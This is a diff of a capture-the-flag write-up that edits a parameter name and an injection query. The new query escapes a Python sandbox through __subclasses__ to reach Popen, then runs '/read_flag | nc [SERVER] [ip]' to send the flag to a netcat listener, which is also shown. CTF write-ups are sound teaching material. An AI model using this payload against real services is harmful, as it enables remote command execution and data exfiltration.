@@ -226,7 +226,7 @@ class index:
         #... ...
 ```
 
-In app.py, set `s` to p, and `l` to LIMIT value.
+In app.py, set `m` to p, and `l` to LIMIT value.
 
 It calls *get_posts(limit)*, then run *db.select*.
 
@@ -486,7 +486,7 @@ db.db
 
 Now you can get flag by encrypt below query.
 
-**Query :** \([i for i in ().\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_() if i.\_\_name\_\_ == 'Popen']\)\[0\]\('/read_flag | nc \[SERVER\] \[ip\]',shell=1\)
+**Query :** m=p&l=${\([i for i in ().\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_() if i.\_\_name\_\_ == 'Popen']\)\[0\]\('/read_flag | nc \[SERVER\] \[ip\]',shell=1\)}
 
 ```
 # nc -lvp 10101
